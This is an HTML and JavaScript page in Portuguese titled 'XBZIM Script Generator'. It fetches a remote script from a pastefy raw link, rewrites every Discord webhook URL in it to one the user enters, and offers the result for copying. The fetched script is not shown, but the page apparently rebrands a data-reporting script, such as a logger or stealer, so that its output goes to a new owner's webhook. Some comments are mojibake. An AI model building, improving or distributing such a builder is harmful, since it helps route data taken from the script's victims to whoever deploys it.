<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XBZIM Script Generator</title>

    <style>
        body {
            font-family: Arial;
            background: #0b0b0b;
            color: #e0e0e0;
            padding: 20px;
            text-align: center;
        }

        h2, h3 {
            color: #9d4dff;
            text-shadow: 0 0 10px #6a00ff;
        }

        input {
            width: 90%;
            padding: 12px;
            border: 2px solid #7a00ff;
            background: #1a1a1a;
            color: white;
            border-radius: 10px;
            font-size: 16px;
            outline: none;
        }

        button {
            padding: 12px 35px;
            background: linear-gradient(90deg, #7a00ff, #b100ff);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 15px;
            box-shadow: 0 0 10px #7a00ff;
        }

        button:hover {
            opacity: 0.8;
        }

        pre {
            background: #1a1a1a;
            padding: 15px;
            color: #d4d4d4;
            border-radius: 10px;
            text-align: left;
            white-space: pre-wrap;
            border: 1px solid #7a00ff55;
            box-shadow: 0 0 10px #5a00ff55 inset;
        }
        
        #copyBtn {
            background: linear-gradient(90deg, #b100ff, #ff00aa);
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <h2>Gerador de Script XBZIM</h2>

    <label>Insira sua Webhook:</label><br>
    <input id="webhookInput" type="text"><br><br>

    <button onclick="gerarScript()">GERAR SCRIPT</button>

    <h3>Webhook usada:</h3>
    <pre id="webhookExibida"></pre>

    <h3>Script Gerado:</h3>
    <pre id="scriptGerado"></pre>

    <button id="copyBtn" onclick="copiarScript()">COPIAR SCRIPT</button>

<script>
async function gerarScript() {
    let webhook = document.getElementById("webhookInput").value;

    if (!webhook) {
        alert("Coloque uma webhook!");
        return;
    }

    // 1 - PEGAR O SCRIPT ORIGINAL
    let scriptOriginal = await fetch("https://pastefy.app/fWfJ9UlE/raw")
        .then(r => r.text())
        .catch(() => null);

    if (!scriptOriginal) {
        alert("Erro ao pegar o script do Pastefy!");
        return;
    }

    // 2 - SUBSTITUIR QUALQUER WEBHOOK ORIGINAL POR A NOVA (B)
    let scriptEditado = scriptOriginal.replace(
        /https:\/\/discord\.com\/api\/webhooks\/[^\s"'`]*/g,
        webhook
    );

    // 3 - EXIBIR RESULTADOS
    document.getElementById("webhookExibida").textContent = webhook;
    document.getElementById("scriptGerado").textContent = scriptEditado;

    // 4 - ENVIAR MENSAGEM DE CONFIRMAÃ‡ÃƒO
    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "ðŸ”¥ Sua webhook foi colocada dentro do script com sucesso!"
            })
        });
    } catch (e) {
        console.log("Erro ao enviar mensagem.");
    }
}

// FUNÃ‡ÃƒO COPIAR SCRIPT
function copiarScript() {
    const texto = document.getElementById("scriptGerado").textContent;
    navigator.clipboard.writeText(texto);
    alert("Script copiado!");
}
</script>

</body>
</html>
